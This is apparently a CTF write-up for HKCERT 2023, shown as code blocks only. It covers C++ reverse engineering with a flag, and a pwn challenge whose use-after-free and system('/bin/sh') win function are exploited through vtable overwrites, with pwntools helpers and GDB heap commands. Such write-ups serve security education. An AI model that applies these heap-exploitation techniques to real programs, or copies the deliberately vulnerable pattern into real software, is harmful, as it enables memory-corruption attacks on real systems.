<span class="token prefix inserted">+</span>  mov     <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0xb8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rdi
</span><span class="token unchanged language-asm"><span class="token prefix unchanged"> </span>  <span class="token comment">; Calling the wrong overload!</span>
</span><span class="token deleted-sign deleted language-asm"><span class="token prefix deleted">-</span>  call    _ZSt3getILm0EKcP8TrieNodeERNSt13tuple_elementIXT_ESt4pairIT0_T1_EE4typeERS7_
</span><span class="token inserted-sign inserted language-asm"><span class="token prefix inserted">+</span>  call    _ZSt3getILm0EKcP8TrieNodeERKNSt13tuple_elementIXT_ESt4pairIT0_T1_EE4typeERKS7_</span></code></pre>
<pre class="language-diff-cpp" tabindex="0"><code class="language-diff-cpp"><span class="token deleted-sign deleted language-cpp"><span class="token prefix deleted">-</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>pair<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span> TrieNode<span class="token operator">*</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token punctuation">)</span>
</span><span class="token unchanged language-cpp"><span class="token prefix unchanged"> </span>  <span class="token operator">+</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>pair<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span> TrieNode<span class="token operator">*</span><span class="token operator">&gt;</span> <span class="token keyword">const</span><span class="token operator">&amp;</span><span class="token punctuation">)</span></span></code></pre>
<pre class="language-diff-cpp" tabindex="0"><code class="language-diff-cpp"><span class="token unchanged language-cpp"><span class="token prefix unchanged"> </span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> next_node<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> next_node<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="token deleted-sign deleted language-cpp"><span class="token prefix deleted">-</span>     <span class="token keyword">auto</span> <span class="token punctuation">[</span>ch<span class="token punctuation">,</span> node<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>it<span class="token punctuation">;</span>
</span><span class="token inserted-sign inserted language-cpp"><span class="token prefix inserted">+</span>     <span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> <span class="token punctuation">[</span>ch<span class="token punctuation">,</span> node<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>it<span class="token punctuation">;</span>
</span><span class="token unchanged language-cpp"><span class="token prefix unchanged"> </span>     new_map<span class="token punctuation">[</span>ch <span class="token operator">^</span> cmix<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">;</span>
<span class="token prefix unchanged"> </span> <span class="token punctuation">}</span></span></code></pre>
<pre class="language-diff-cpp" tabindex="0"><code class="language-diff-cpp"><span class="token deleted-sign deleted language-cpp"><span class="token prefix deleted">-</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> next_node<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> next_node<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token prefix deleted">-</span>     <span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> <span class="token punctuation">[</span>ch<span class="token punctuation">,</span> node<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>it<span class="token punctuation">;</span>
</span><span class="token inserted-sign inserted language-cpp"><span class="token prefix inserted">+</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> <span class="token punctuation">[</span>ch<span class="token punctuation">,</span> node<span class="token punctuation">]</span> <span class="token operator">:</span> next_node<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="token unchanged language-cpp"><span class="token prefix unchanged"> </span>     new_map<span class="token punctuation">[</span>ch <span class="token operator">^</span> cmix<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">;</span>
<span class="token prefix unchanged"> </span> <span class="token punctuation">}</span></span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span>range_decl <span class="token operator">:</span> range_expr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token comment">/* ... */</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token punctuation">{</span>
	<span class="token keyword">auto</span><span class="token operator">&amp;&amp;</span> __range <span class="token operator">=</span> range_expr<span class="token punctuation">;</span>
	<span class="token keyword">auto</span> __begin <span class="token operator">=</span> begin<span class="token punctuation">;</span> <span class="token comment">// Usually std::begin(__range)</span>
	<span class="token keyword">auto</span> __end <span class="token operator">=</span> end<span class="token punctuation">;</span>     <span class="token comment">// ...and std::end(__range).</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> __begin <span class="token operator">!=</span> __end<span class="token punctuation">;</span> <span class="token operator">++</span>__begin<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		range_decl <span class="token operator">=</span> <span class="token operator">*</span>__begin<span class="token punctuation">;</span>
		<span class="token comment">/* ... */</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">hkcert23{c++stl_i5_ev3rywh3r3_dur1ng_r3v}</code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span><span class="token operator">*</span> win_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>win<span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">challenges</span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">forensics</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">reversing</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">pwn</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">web</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">crypto</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// -- Read choice, index from input. --</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>choice <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> forensics<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>choice <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> reversing<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// ...</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> crypto<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// -- Read index from input. --</span>
downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">delete</span> downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// -- Read length from input. --</span>
<span class="token keyword">char</span><span class="token operator">*</span> writeup <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fgets</span><span class="token punctuation">(</span>writeup<span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Read writeup payload from input.</span></code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">def</span> <span class="token function">download_chal</span><span class="token punctuation">(</span>category<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> save_index<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;=</span> category <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> save_index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>save_index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">solve_chal</span><span class="token punctuation">(</span>index<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad"</span><span class="token punctuation">)</span>
    
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">submit_writeup</span><span class="token punctuation">(</span>content<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> length <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> length<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"your math bad bad"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token string">b'\n'</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad newline"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token comment">// void* vtable; // Implicit, but exists due to virtual functions.</span>
    <span class="token keyword">int</span> parent_data<span class="token punctuation">;</span>
    <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">)</span> <span class="token operator">:</span> parent_data<span class="token punctuation">{</span>data<span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"parent ("</span> <span class="token operator">&lt;&lt;</span> parent_data <span class="token operator">&lt;&lt;</span> <span class="token string">") foo: "</span> <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"parent ("</span> <span class="token operator">&lt;&lt;</span> parent_data <span class="token operator">&lt;&lt;</span> <span class="token string">") bar: "</span> <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// Inherits Parent::parent_data and Parent::foo.</span>
<span class="token keyword">class</span> <span class="token class-name">Derived</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">Parent</span></span> <span class="token punctuation">{</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token comment">// void* vtable; // Implicit for same reason as Parent.</span>
    <span class="token keyword">int</span> derived_data<span class="token punctuation">;</span>
    <span class="token function">Derived</span><span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">,</span> <span class="token keyword">int</span> data2<span class="token punctuation">)</span> <span class="token operator">:</span> Parent<span class="token punctuation">{</span>data<span class="token punctuation">}</span><span class="token punctuation">,</span> derived_data<span class="token punctuation">{</span>data2<span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token comment">// Overrides Parent::bar.</span>
    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"derived ("</span> <span class="token operator">&lt;&lt;</span> parent_data <span class="token operator">&lt;&lt;</span> <span class="token string">", "</span> <span class="token operator">&lt;&lt;</span> derived_data <span class="token operator">&lt;&lt;</span> <span class="token string">") bar: "</span> <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Parent p<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    p<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Parent::foo</span>
    p<span class="token punctuation">.</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Parent::bar</span>

    Derived d<span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Parent::foo</span>
    d<span class="token punctuation">.</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Derived::bar</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token class-name">funcptr_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Type alias for function pointers.</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    <span class="token class-name">funcptr_t</span><span class="token operator">*</span> vtable<span class="token punctuation">;</span>
    <span class="token keyword">int</span> parent_data<span class="token punctuation">;</span>
<span class="token punctuation">}</span> Parent<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    <span class="token class-name">funcptr_t</span><span class="token operator">*</span> vtable<span class="token punctuation">;</span>
    <span class="token keyword">int</span> parent_data<span class="token punctuation">;</span> <span class="token comment">// Inherited from Parent.</span>
    <span class="token keyword">int</span> derived_data<span class="token punctuation">;</span>
<span class="token punctuation">}</span> Derived<span class="token punctuation">;</span>

<span class="token comment">// Enumeration of virtual functions.</span>
<span class="token keyword">enum</span> <span class="token punctuation">{</span> VFUNCTION_FOO<span class="token punctuation">,</span> VFUNCTION_BAR <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// Concrete implementations.</span>
<span class="token keyword">void</span> <span class="token function">parent__foo</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"parent (%d) foo: %d\n"</span><span class="token punctuation">,</span> p<span class="token operator">-&gt;</span>parent_data<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">parent__bar</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"parent (%d) bar: %d\n"</span><span class="token punctuation">,</span> p<span class="token operator">-&gt;</span>parent_data<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">derived__bar</span><span class="token punctuation">(</span>Derived<span class="token operator">*</span> d<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"derived (%d, %d) bar: %d\n"</span><span class="token punctuation">,</span> d<span class="token operator">-&gt;</span>parent_data<span class="token punctuation">,</span> d<span class="token operator">-&gt;</span>derived_data<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token comment">// Virtual implementations (redirect).</span>
<span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> p<span class="token operator">-&gt;</span>vtable<span class="token punctuation">[</span>VFUNCTION_FOO<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> p<span class="token operator">-&gt;</span>vtable<span class="token punctuation">[</span>VFUNCTION_BAR<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token comment">// vtable definitions.</span>
<span class="token class-name">funcptr_t</span> parent__vtable<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    parent__foo<span class="token punctuation">,</span>
    parent__bar<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token class-name">funcptr_t</span> derived__vtable<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    parent__foo<span class="token punctuation">,</span>
    derived__bar<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Parent p <span class="token operator">=</span> <span class="token punctuation">{</span>parent__vtable<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// parent__foo</span>
    <span class="token function">bar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// parent__bar.</span>

    Derived d <span class="token operator">=</span> <span class="token punctuation">{</span>derived__vtable<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>d<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// parent__foo</span>
    <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>d<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// derived__bar.</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">;</span>
    <span class="token comment">// Suppose p == 0x404000.</span>
    <span class="token keyword">delete</span> p<span class="token punctuation">;</span>
    <span class="token comment">// Pointer value is still 0x404000, not NULL or anything else.</span>
<span class="token punctuation">}</span></code></pre>
<pre data-language="GDB" class="language-sh" tabindex="0"><code class="language-sh">r               <span class="token comment"># Run the file.</span>
c               <span class="token comment"># Continue running where we left off.</span>
heap chunks     <span class="token comment"># View active chunks on the heap.</span>
x /40wx <span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>  <span class="token comment"># View memory at address as hex data.</span>
x /40wi <span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>  <span class="token comment"># View memory at address as instructions.</span>
disas <span class="token operator">&lt;</span>sym<span class="token operator">&gt;</span>     <span class="token comment"># Disassemble a symbol.</span>
b *<span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>       <span class="token comment"># Set a breakpoint at the specified address.</span>
<span class="token function">kill</span>            <span class="token comment"># Useful for stopping the current run in case we make an oopsie and need to restart.</span></code></pre>
<pre class="command-line language-sh" data-prompt="$" data-continuation-prompt="gef>" data-continuation-str="  " tabindex="0"><code class="language-sh">gdb ctf_sim  
r  
^C  
heap chunks  </code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh">c  
<span class="token number">1</span>  
<span class="token number">1</span>  
<span class="token number">0</span></code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt=">" data-continuation-prompt="gef>" data-continuation-str="  " tabindex="0"><code class="language-sh">^C  
heap chunks</code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh">disas solveChallenge
b *solveChallenge+191</code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh">c  
<span class="token number">2</span>  
<span class="token number">0</span></code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh">c  
^C
heap chunks</code></pre>
